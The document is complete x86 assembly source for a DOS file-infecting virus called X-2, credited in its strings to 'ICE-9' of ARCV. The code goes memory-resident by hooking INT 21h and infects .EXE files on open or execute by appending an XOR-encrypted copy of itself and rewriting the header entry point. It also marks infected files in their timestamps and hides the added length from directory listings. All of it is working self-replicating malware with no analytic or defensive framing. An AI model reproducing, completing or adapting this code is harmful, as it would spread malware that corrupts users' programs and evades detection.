
                        NAME X_2
                        PAGE 55,132
                        TITLE ?????


len                     equ offset handle-0100h
en_len1                 equ offset encry_and_save-offset main2


code segment

                        ASSUME CS:CODE,DS:CODE,ES:CODE

                        org 100h



main:                   jmp set_up      ; set up for first execution of virus

main1:                  call next_line          ; find out offset of code
next_line:              pop si
                        sub si,offset next_line
                        call level1             ; unencrypt virus
main2:                  mov ax,cs
                        mov ds,ax               ; set DS == CS
                        mov ds:[data_seg+si],es ; store date seg
                        mov ds:[stck_seg+si],ss ; store stack seg
                        mov ds:[stck_p+si],sp   ; store stack pointer
                        mov ax,cs               ; set up new SS and SP
                        xor sp,sp
                        dec sp
                        add ax,10h
                        mov ss,ax

                        mov ax,ds:[code_seg+si] ; calculate return address
                        mov cx,ds:[code_ip+si]
                        mov bx,es
                        add bx,10h
                        add ax,bx
                        mov word ptr ds:[ret1+1+si],ax  ; save it 
                        mov word ptr ds:[ret2+1+si],cx
check_instal:           mov ax,0fa09h           ; check for prev. installation
                        int 21h
                        cmp ax,-0fa09h
                        je in_mem


inst:                   call install            ; install into mem
                        
in_mem:                 mov ax,ds:[stck_seg+si] ; get old vals for SS, SP, DS
                        mov bx,ds:[stck_p+si]
                        mov cx,ds:[data_seg+si]
                        mov ds,cx               ; restore them
                        mov es,cx
                        mov ss,ax
                        mov sp,bx
                        xor si,si
                        xor di,di

ret1:                   mov ax,0000h            ; get return address
ret2:                   mov bx,0000h
                        push ax
                        push bx
                        retf                    ; return to old code


adjust_handle:          push si                 ; store regs.
                        push es
                        push bx
                        push ax
                        mov ah,2fh              ; find current DTA
                        int 21h  
                        pop ax
                        test ah,40h             ; is it FCB or Handle
                        jz fcb_adjust
                        call i21                ; do it.
                        pushf 
                        jc dont_adjust          ; if we got an error just exit
                        mov al,byte ptr es:[bx+16h]
                        and al,1fh              ; check for stealth marker
                        cmp al,1eh
                        jne dont_adjust
                        sub word ptr es:[bx+1ah],len    ; adjust length
                        sbb word ptr es:[bx+1ch],0
dont_adjust:            popf
dont_adjust_fcb:        pop bx
                        pop es                  ; restore regs
                        pop si
                        retf 2                  ; return

fcb_adjust:             call i21                ; do FCB find
                        cmp al,0ffh             ; if error just exit
                        je no_fcb_match
                        xor si,si
                        cmp byte ptr es:[bx],0ffh       ; is it an extended FCB
                        jne fcb_alter
                        add si,7h
fcb_alter:              mov al,byte ptr es:[bx+si+17h]
                        and al,1fh             ; check for stealth marker
                        cmp al,1eh
                        jne no_fcb_match_al0
                        sub es:[bx+si+1dh],len ; adjust length
                        sbb word ptr es:[bx+si+1fh],0h
no_fcb_match_al0:       xor al,al
no_fcb_match:           jmp dont_adjust_fcb

new21:                  cmp ax,0fa09h           ; show we're installed
                        jne check_for_handle
                        neg ax
                        retf 2
check_for_handle:       cmp ah,4eh              ; just checks to see which
                        je adjust_handle        ; sub-function of INT21 
                        cmp ah,4fh              ; they are doing
                        je adjust_handle
                        cmp ah,11h
                        je adjust_handle
                        cmp ah,12h
                        je adjust_handle
                        cmp ah,4bh
                        je check_infect
                        cmp ah,3dh
                        je check_infect  
chain_21:               jmp cs:[int21]

debug_print:            xor bx,bx       
                        mov ax,0010h
                        mov ss,bx
                        mov sp,ax       
                        pop cx

check_infect:           push ax                 ; save all regs
                        push bx
                        push cx
                        push si
                        push di
                        push es
                        push ds
                        push dx
                        mov di,dx
                        mov cx,6fh
                        mov al,'.'
                        cld
                        push ds
                        pop es
                        repnz scasb
                        cmp ds:[di+1],'EX'      ; is file .EXe
                        je infect_file
pop_all:                pop dx
                        pop ds
pop_bits:               pop es
                        pop di
                        pop si
                        pop cx
                        pop bx
                        pop ax
                        jmp chain_21

infect_file:            mov ax,4300h            ; get attribs
                        call i21
                        mov cs:[file_att],cx    ; save them
                        xor cx,cx
                        call set_attr           ; clear attribs

                        mov ax,3d02h            ; open file
                        call i21
                        push cs
                        pop ds
                        mov ds:[handle],ax      ; store handle

                        mov ax,5700h            ; get file time/date
                        call file_int21
                        mov ds:[file_time],cx   ; save file time/date
                        mov ds:[file_date],dx

                        mov ah,3fh
                        mov dx,offset header    ; read in header
                        mov cx,18h
                        call file_int21

                        mov ax,4202h            ; move file pointer to 
                        xor cx,cx               ; -4 bytes from end of file
                        dec cx
                        mov dx,-4
                        call file_int21
                        add ax,4                ; get real length
                        adc dx,0

                        mov word ptr ds:[file_len],ax   ; save length
                        mov word ptr ds:[file_len+2],dx 
 

                        mov ah,3fh              ; read in 4 bytes which
                        mov cx,4                ; may be our marker
                        mov dx,offset temp1
                        call file_int21


                        mov di,offset temp1
                        mov si,offset marker
                        mov cx,4
                        push cs
                        pop es
                        repe cmpsb              ; check for marker
                        jcxz pop_all


                        mov ax,word ptr ds:[header+14h]
                        mov bx,word ptr ds:[header+16h]
                        mov ds:[code_seg],bx    ; get old start address
                        mov ds:[code_ip],ax

                        call encry_and_save     ; write our virus to end of file

                        mov ax,word ptr ds:[file_len] 
                        mov dx,word ptr ds:[file_len+2] 


                        push ax 
                        push dx 

                        mov bx,word ptr ds:[header+08h] ; get header length

                        mov cx,10h              ; sub it from total length
                        div cx 

                        add bx,10h
                        sub ax,bx  

                        mov word ptr ds:[header+16h],ax ; store new start seg

                        add dx,0103h
                        mov word ptr ds:[header+14h],dx ; store new start offset

                        pop dx
                        pop ax

                        add ax,len
                        adc dx,0h

                        push ax                 ; calculate new length
                        mov cl,9                ; DIV 512
                        shr ax,cl               ; MOD 512 
                        ror dx,cl
                        stc

                        adc dx,ax
                        pop ax
                        and ah,1

                        mov word ptr ds:[header+02h],ax ; write this length
                        mov word ptr ds:[header+04h],dx ; to header
 
                        mov ax,4200h            ; move file pointer to
                        xor dx,dx               ; start of file
                        mov cx,dx 
                        call file_int21

                        mov ah,40h              ; write new header
                        mov dx,offset header
                        mov cx,18h
                        call file_int21

                        mov cx,ds:[file_time]   ; get old file time/date
                        mov dx,ds:[file_date]
                        or cl,1fh               ; place our stealth marker
                        and cl,0feh             ; in second part of time
                        mov ax,5701h            ; write this time/date to
                        call file_int21         ; file


                        mov ah,3eh              ; close file
                        call file_int21

                        mov cx,ds:[file_att]    
                        pop dx
                        pop ds
                        call set_attr           ; restore old attribs

                        jmp pop_bits            ; pop all regs


install:        push ds                 ; adjust MCB to get 3 Kbytes at top
                mov ax,es               ; of memory
                dec ax
                mov es,ax
                cmp byte ptr es:[0],5ah         
                jne old_prog                     
                mov ax,es:[3]                   
                sub ax,0bch                     
                jb  old_prog                     
                mov es:[3],ax                   
                sub word ptr es:[12h],0bch      
                mov es,es:[12h]                 


                mov di,0100h            ; move our code to top of memory
                lea ax,[0100h+si]
                mov cx,len+5
                push cs
                pop ds
                cld
                xchg ax,si
                repnz movsb
                xchg ax,si


                mov ax,0008h                    ; get and change INT21 vector
                mov ds,ax
                mov ax,offset new21             
                mov bx,es
                xchg word ptr ds:[0004h],ax
                xchg word ptr ds:[0006h],bx
                cli
                mov word ptr es:[int21],ax      ; store it our code
                mov word ptr es:[int21+2],bx
                sti
old_prog:       pop ds
                ret


                        db '[X-2]',00h
                        db 'ICE-9, -< ARCV >-',00h
                        db 'Made in England. '
                        db 'Hi I',39,'am called X-2, get my name right! '
                        db 'Look out for the X-3 twins.' 
 


encry_and_save:         xor si,si       ; get new key
retry:                  mov ah,2ch
                        call i21
                        cmp dh,0h
                        je retry
                        mov byte ptr cs:[marker-1],dh
                        call level1     ; encrypt virus
                        mov ah,40h      ; write code
                        mov cx,len
                        mov dx,offset main
                        call file_int21
                        call level1     ; unencrypt our code
                        ret

code_seg                dw 0fff0h
code_ip                 dw 0h
 

set_attr:               mov ax,4301h
file_int21:             mov bx,ds:[handle]
i21:                    pushf
                        call cs:[int21]
                        ret


level1:                 lea di,(main2+si)
                        mov cx,en_len1
un1:                    xor byte ptr cs:[di],01h
marker:                 inc di
                        loop un1
                        ret
 
; end of virus

handle                  dw 0h
stck_seg                dw 0h
data_seg                dw 0h
stck_p                  dw 0h
file_time               dw 0h
file_date               dw 0h
file_att                dw 0h
file_len                dd 0h
code_off                db 0h
temp1                   db 5 dup (?)
header                  db 18h dup (?)
int21                   dd 0h

set_up:                 xor si,si  
                        mov ds:[code_seg+si],-10h
                        mov ds:[code_ip+si],0100h
                        mov ds:[0100h+si],20cdh
                        call level1
                        jmp main1

code ends

end main